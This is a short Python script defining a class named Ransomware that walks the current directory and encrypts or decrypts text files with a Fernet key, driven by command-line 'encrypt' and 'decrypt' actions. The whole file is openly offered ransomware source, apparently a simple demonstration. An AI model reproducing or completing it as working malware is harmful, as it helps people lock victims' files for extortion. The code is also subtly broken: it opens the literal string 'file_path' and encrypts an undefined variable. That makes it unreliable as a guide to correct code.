import os
from os.path import expanduser
from cryptography.fernet import Fernet

class Ransomware(object):
	
	def __init__(self):
		self.key = None
		self.cryptor = None
		self.file_ext_targets = ['txt']
		
	def generate_key(self):
		self.key = Fernet.generate_key()
		self.cryptor = Fernet(self.key)
		
	def read_key(self, keyfile):
		with open(keyfile, 'rb') as f:
			self.key = f.read()
			self.cryptor = Fernet(self.key)
			
	def write_key(self, keyfile):
		print(self.key)
		with open(keyfile, 'wb') as f:
			f.write(self.key)
			
	def crypt_root(self, root_dir, encrypted=False):
		for root, _, files in os.walk(root_dir):
			for f in files:
				abs_file_path = os.path.join(root, f)
				
				if not abs_file_path.split(".")[-1] in self.file_ext_targets:
					continue
				self.crypt_file(abs_file_path, encrypted=encrypted)
				
	def crypt_file(self, file_path, encrypted=False):
		with open('file_path', 'rb+') as f:
			_data = f.read()
			if not encrypted:
				print()
				print(f"File contents before encryption: {_data}")
				data = self.cryptor.encrypt(data)
				print(f"File contents after encryption: {data}")
			else:
				data = self.cryptor.decrypt(_data)
				print(f"File content before encryption: {data}")
			f.seek(0)
			f.write(data)
			
			
if __name__ == '__main__':
	local_root = '.'
	
	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument('--action', required=True)
	parser.add_argument('--keyfile')
	
	args = parser.parse_args()
	action = args.action.lower()
	keyfile = args.keyfile
	
	ransom = Ransomware()
	
	if action == 'decrypt':
		if keyfile is None:
			print("Path to keyfile must be specified after --keyfile for decryption")
		else:
			ransom.read_key(keyfile)
			ransom.crypt_root(local_root, encrypted=True)
	elif action == 'encrypt':
		ransom.generate_key()
		ransom.write_key("keyfile")
		ransom.crypt_root(local_root)
